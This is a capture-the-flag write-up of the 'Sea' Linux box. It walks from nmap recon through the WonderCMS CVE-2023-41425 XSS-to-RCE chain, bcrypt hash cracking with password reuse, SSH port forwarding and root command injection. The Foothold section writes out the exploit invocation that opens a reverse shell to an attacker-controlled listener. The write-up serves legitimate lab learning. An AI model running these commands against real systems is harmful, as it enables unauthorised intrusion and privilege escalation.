# Sea — Easy — Linux

**Date:** 7 June 2026

---

## Tags
`#linux` `#web` `#wondercms` `#xss` `#cve-2023-41425` `#hash-cracking` `#command-injection` `#port-forwarding` `#privesc`

---

## What I Know

| Item       | Detail                                            |
| ---------- | ------------------------------------------------- |                         
| OS         | Linux                                             |
| Open ports | 22 (SSH), 80 (HTTP)                               |
| Services   | OpenSSH on 22; Apache serving WonderCMS 3.2.0 on 80 |

---

## Recon Notes

### Nmap Results

```
nmap -p- --min-rate 3000 -T4 10.129.12.155 -oA Sea_Scan_Initial

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-07 10:56 +0100
Nmap scan report for 10.129.12.155
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.90 seconds
```

<img width="886" height="326" alt="image" src="https://github.com/user-attachments/assets/e593daf4-c4cd-4e36-b3ae-1ef1c9cf75cd" />

```
nmap -sC -sV -Pn 10.129.12.155 -p22,80 -oA Sea_Scan_Detailed

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-07 10:59 +0100
Nmap scan report for 10.129.12.151
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: sea.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.66 seconds
```

<img width="1216" height="460" alt="image" src="https://github.com/user-attachments/assets/0b505ba1-0e99-4b6b-8613-5755999962d7" />


**What each port tells me:**
- **Port 22 (SSH)** — open, but I have no credentials yet, so this is a target to come back to once I find some.
- **Port 80 (HTTP)** — a web application is running. This is my entry point, so I'll focus here first.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: I could SSH into the server if I had valid credentials
WHAT I AM GOING TO TRY: Park it for now
WHY: I don't have credentials yet
RESULT: N/A
WHAT NEXT: Investigate port 80
```

```
OBSERVATION: Port 80 is open
WHAT IT TELLS ME: The server is hosting a web application
WHAT I AM GOING TO TRY: Browse the application and inspect each page
WHY: To understand what the application does and find an attack surface
RESULT: It's a 3-page application. /contact.php is the most interesting because it has input fields
WHAT NEXT: Directory fuzzing to find hidden paths
```

<img width="1799" height="847" alt="image" src="https://github.com/user-attachments/assets/d305a8a3-129d-4ee2-93fe-893312a15db0" />

```
OBSERVATION: Fuzzing surfaced http://10.129.12.155/themes/bike/version — navigated to it
WHAT IT TELLS ME: Something is running at version 3.2.0
WHAT I AM GOING TO TRY: Identify what that version belongs to
WHY: A specific version may map to a known, exploitable CVE
RESULT: The "themes" directory is a strong CMS indicator, so I checked /README.md — it confirmed the app is WonderCMS 3.2.0
WHAT NEXT: Look for a public exploit for this version
```

<img width="1151" height="299" alt="image" src="https://github.com/user-attachments/assets/f8a8f489-a3a4-4f00-8f00-065594f51e7e" />

```
OBSERVATION: WonderCMS 3.2.0 is vulnerable to CVE-2023-41425
WHAT IT TELLS ME: A stored/reflected XSS can be chained to upload a malicious module and achieve RCE
WHAT I AM GOING TO TRY: Use https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE to get a foothold
WHY: The exploit automates the XSS-to-module-upload chain for this exact version
RESULT: Got a reverse shell as www-data
WHAT NEXT: Find and read user.txt
```

<img width="1094" height="198" alt="image" src="https://github.com/user-attachments/assets/5d1fa3d0-c2fa-4117-a129-c7c2036b6b1a" />

<img width="1137" height="417" alt="image" src="https://github.com/user-attachments/assets/a9b075d6-e206-4c36-bff2-7c84839e5a2e" />


```
OBSERVATION: Two users exist (amay, geo). www-data cannot read /home/amay/user.txt
WHAT IT TELLS ME: I need to laterally move to amay
WHAT I AM GOING TO TRY: Enumerate the foothold for creds / misconfigurations
WHY: To move laterally
RESULT: /var/www/sea/data/database.js contains a bcrypt password hash. Cracked it via https://hashes.com/en/decrypt/hash
WHAT NEXT: Reuse the cracked password to access amay
```
<img width="554" height="340" alt="image" src="https://github.com/user-attachments/assets/f2d47831-5dbb-49e5-a269-d732a1d53359" />

<img width="554" height="340" alt="image" src="https://github.com/user-attachments/assets/42f6eff2-e11a-4f45-a9eb-89f2f86ff0ac" />

<img width="2203" height="535" alt="image" src="https://github.com/user-attachments/assets/f3c6f7a9-c638-4f51-ba5a-ee992f32015a" />

```
OBSERVATION: The cracked password works for amay (SSH / su), and I can now read user.txt
WHAT IT TELLS ME: amay reused the WonderCMS password for their system account
WHAT I AM GOING TO TRY: Enumerate as amay to find a path to root
WHY: I need a privilege escalation vector
RESULT: A service is listening on 127.0.0.1:8080, only reachable from localhost
WHAT NEXT: Port-forward 8080 back to my box to inspect it
```
<img width="1054" height="599" alt="image" src="https://github.com/user-attachments/assets/69529ca0-3d07-432d-aa6f-bf105baa4517" />

```
OBSERVATION: Forwarded the internal port with SSH (ssh -L 8080:127.0.0.1:8080 amay@10.129.12.155)
WHAT IT TELLS ME: I can now reach the internal service from my browser
WHAT I AM GOING TO TRY: Open it and identify what it is
WHY: Internal-only services are often less hardened and run as root
RESULT: It's a custom system-monitoring dashboard
WHAT NEXT: Probe its functionality for an injection point
```

<img width="936" height="55" alt="image" src="https://github.com/user-attachments/assets/91a30811-5f59-46cb-b51f-23489ee843e8" />

<img width="2155" height="1133" alt="image" src="https://github.com/user-attachments/assets/baabea1d-8cb4-4d50-b0a8-7dcd2103cb50" />


```
OBSERVATION: The dashboard reads server files (e.g. log files) and runs as root
WHAT IT TELLS ME: If I can influence the file path / command, I may get root-level file read or command execution
WHAT I AM GOING TO TRY: Inject into the file-analysis parameter to read root-owned files / run commands
WHY: The tool is custom-built, so input validation is likely weak (command injection)
RESULT: Confirmed command injection running as root — read /root/root.txt
WHAT NEXT: Box complete; write up the debrief
```

---

## Foothold

**How I got in:** Exploited CVE-2023-41425 in WonderCMS 3.2.0, a cross-site scripting flaw that lets an attacker trick the admin session into uploading a malicious theme/module, which is then executed for remote code execution.

**Command / exploit used:**
```
git clone https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE
python3 CVE-2023-41425.py -rhost http://sea.htb/loginURL -lhost 10.10.14.101 -lport 9001 -sport 8000
# nc -lnvp 9001  (catch the shell as www-data)
```

**Why it worked:** WonderCMS 3.2.0's login page reflected unsanitised input, so a crafted URL injected a script that abused the authenticated admin's session to upload a PHP module. Visiting the uploaded module triggered the reverse shell.

---

## Privilege Escalation

**Path taken (www-data → amay → root):**
1. **www-data → amay:** Read `/var/www/sea/data/database.js`, extracted the bcrypt hash, cracked it offline, and reused the recovered password for amay's account to read `user.txt`.
2. **amay → root:** Found a root-owned system-monitoring web app bound to `127.0.0.1:8080`. Port-forwarded it over SSH, then exploited a command injection in its file-analysis feature to execute commands as root and read `root.txt`.

**Why it worked:** WonderCMS stored its admin credentials in a world-readable config file, and the password was reused for the system account. The internal monitoring tool was custom-built, ran as root, and passed user-controlled input into a shell command without sanitisation.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Chained a WonderCMS XSS (CVE-2023-41425) into an authenticated module upload to get RCE as www-data.
2. **Privesc technique in one sentence:** Cracked a reused bcrypt password from the CMS database to become amay, then command-injected a root-owned internal monitoring app for root.
